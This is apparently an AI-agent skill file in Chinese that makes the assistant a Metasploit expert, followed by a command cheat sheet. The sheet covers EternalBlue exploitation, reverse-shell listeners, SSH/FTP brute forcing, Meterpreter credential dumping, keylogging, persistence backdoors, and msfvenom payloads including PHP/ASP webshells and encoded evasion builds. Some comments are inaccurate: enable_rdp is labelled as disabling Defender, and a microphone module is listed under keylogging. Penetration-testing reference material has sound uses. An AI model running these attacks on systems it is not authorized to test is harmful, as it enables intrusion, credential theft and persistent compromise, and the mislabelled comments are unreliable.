---
name: metasploit
description: Metasploit — 漏洞利用框架
---

你是 metasploit 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# Metasploit — 漏洞利用框架

## 基本信息

| 项目 | 内容 |
|------|------|
| 路径 | `/opt/tools/metasploit/msfconsole` |
| 启动命令 | `cd /opt/tools/metasploit && bundle install && ./msfconsole` |
| 适用场景 | 漏洞利用、Payload 生成、后渗透、会话管理 |

---

## 启动与初始化

```bash
# 方式一：系统自带（如果已安装）
msfconsole

# 方式二：指定路径
cd /opt/tools/metasploit
bundle install  # 首次运行需要
./msfconsole

# 静默启动（不显示 banner）
msfconsole -q

# 直接执行命令
msfconsole -q -x "use exploit/...; set RHOSTS target; run; exit"

# 执行资源脚本
msfconsole -r my_script.rc
```

---

## 核心命令速查

### 搜索与信息

```
msf> search <keyword>           # 搜索模块
msf> search type:exploit name:wordpress
msf> search cve:2021-41773
msf> info <module>              # 查看模块详情
msf> show options               # 查看当前模块选项
msf> show payloads              # 列出可用 Payload
msf> show targets               # 列出可用目标
```

### 模块操作

```
msf> use <module_path>          # 加载模块
msf> use exploit/multi/handler  # 加载监听器
msf> back                       # 退出当前模块
msf> previous                   # 返回上一个模块
msf> reload_all                 # 重新加载所有模块
```

### 参数设置

```
msf> set RHOSTS target_ip       # 设置目标
msf> set LHOST attacker_ip      # 设置本机 IP
msf> set LPORT 4444             # 设置监听端口
msf> set PAYLOAD <payload>      # 设置 Payload
msf> setg RHOSTS target_ip      # 全局设置（跨模块）
msf> unset RHOSTS               # 取消设置
msf> show options               # 查看所有选项
```

### 执行

```
msf> run                        # 执行（同 exploit）
msf> exploit                    # 执行利用
msf> exploit -j                 # 后台执行
msf> check                      # 检查目标是否存在漏洞
```

### 会话管理

```
msf> sessions                   # 列出所有会话
msf> sessions -i 1              # 进入会话 1
msf> sessions -k 1              # 关闭会话 1
msf> sessions -K                # 关闭所有会话
msf> sessions -u 1              # 升级会话（shell→meterpreter）
msf> jobs                       # 列出后台任务
msf> kill <job_id>              # 终止任务
```

---

## 典型使用场景

### 1. 建立监听（接收反弹 Shell）

```bash
msf> use exploit/multi/handler
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST YOUR_IP
msf> set LPORT 4444
msf> set ExitOnSession false    # 持续监听
msf> run -j                     # 后台运行
```

### 2. 永恒之蓝 EternalBlue（MS17-010）

```bash
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target_ip
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST YOUR_IP
msf> set LPORT 4444
msf> run
```

### 3. 漏洞扫描（辅助模块）

```bash
# SMB MS17-010 检测
msf> use auxiliary/scanner/smb/smb_ms17_010
msf> set RHOSTS 192.168.1.0/24
msf> run

# SSH 扫描
msf> use auxiliary/scanner/ssh/ssh_version
msf> set RHOSTS target_ip
msf> run

# SMB 枚举
msf> use auxiliary/scanner/smb/smb_enumshares
msf> set RHOSTS 192.168.1.0/24
msf> run
```

### 4. 暴力破解（辅助模块）

```bash
# SSH 暴破
msf> use auxiliary/scanner/ssh/ssh_login
msf> set RHOSTS target_ip
msf> set USER_FILE /opt/wordlists/seclists/Usernames/Names/names.txt
msf> set PASS_FILE /opt/wordlists/rockyou.txt
msf> set VERBOSE false
msf> run

# FTP 暴破
msf> use auxiliary/scanner/ftp/ftp_login
msf> set RHOSTS target_ip
msf> set USER_FILE users.txt
msf> set PASS_FILE /opt/wordlists/rockyou.txt
msf> run
```

### 5. Meterpreter 常用命令

```
meterpreter> sysinfo            # 系统信息
meterpreter> getuid             # 当前用户
meterpreter> getsystem          # 尝试提权至 SYSTEM
meterpreter> getpid             # 当前进程 PID
meterpreter> ps                 # 进程列表
meterpreter> migrate <pid>      # 迁移到目标进程
meterpreter> shell              # 进入 cmd shell
meterpreter> pwd / cd / ls      # 文件操作
meterpreter> upload local remote # 上传文件
meterpreter> download remote local # 下载文件
meterpreter> search -f *.txt    # 搜索文件
meterpreter> hashdump           # 提取 Windows Hash
meterpreter> run post/...       # 运行后渗透模块
meterpreter> background         # 后台挂起
meterpreter> exit               # 关闭会话
```

### 6. 后渗透模块

```bash
# 枚举 Windows 凭据
meterpreter> run post/windows/gather/credentials/credential_collector

# 枚举本地用户
meterpreter> run post/windows/gather/enum_logged_on_users

# 键盘记录
meterpreter> run post/multi/manage/record_mic
meterpreter> keyscan_start
meterpreter> keyscan_dump

# 截图
meterpreter> screenshot

# 持久化后门
meterpreter> run post/windows/manage/persistence

# 关闭 Windows Defender
meterpreter> run post/windows/manage/enable_rdp
```

### 7. Payload 生成（msfvenom）

```bash
# Windows 反弹 Shell（EXE）
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -f exe -o shell.exe

# Windows PowerShell 编码
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -f psh-cmd

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -f elf -o shell.elf

# PHP Webshell
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -f raw -o shell.php

# ASP Webshell
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -f asp -o shell.asp

# Python
msfvenom -p cmd/unix/reverse_python \
         LHOST=YOUR_IP LPORT=4444 \
         -f raw

# 添加编码绕过（规避）
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=YOUR_IP LPORT=4444 \
         -e x64/xor_dynamic -i 5 \
         -f exe -o encoded_shell.exe
```

### 8. 资源脚本（自动化）

```bash
# 创建资源脚本
cat > auto_exploit.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set ExitOnSession false
run -j
EOF

# 执行
msfconsole -q -r auto_exploit.rc
```

---

## 常用模块速查

| 模块路径 | 用途 |
|---------|------|
| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue |
| `exploit/windows/smb/ms08_067_netapi` | MS08-067 |
| `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Shellshock |
| `exploit/unix/webapp/wp_admin_shell_upload` | WordPress 后台上传 |
| `exploit/multi/handler` | 通用监听器 |
| `auxiliary/scanner/smb/smb_ms17_010` | EternalBlue 检测 |
| `auxiliary/scanner/portscan/tcp` | TCP 端口扫描 |
| `auxiliary/scanner/ssh/ssh_login` | SSH 暴破 |
| `post/windows/gather/hashdump` | Windows Hash 提取 |
| `post/multi/recon/local_exploit_suggester` | 本地提权建议 |

---

## 模块搜索技巧

```bash
# 按 CVE 搜索
msf> search cve:2021-41773

# 按平台搜索
msf> search platform:windows type:exploit

# 按 rank 过滤（excellent 最可靠）
msf> search type:exploit rank:excellent name:apache

# 搜索特定漏洞
msf> search ms17-010
msf> search eternalblue
msf> search log4j
```
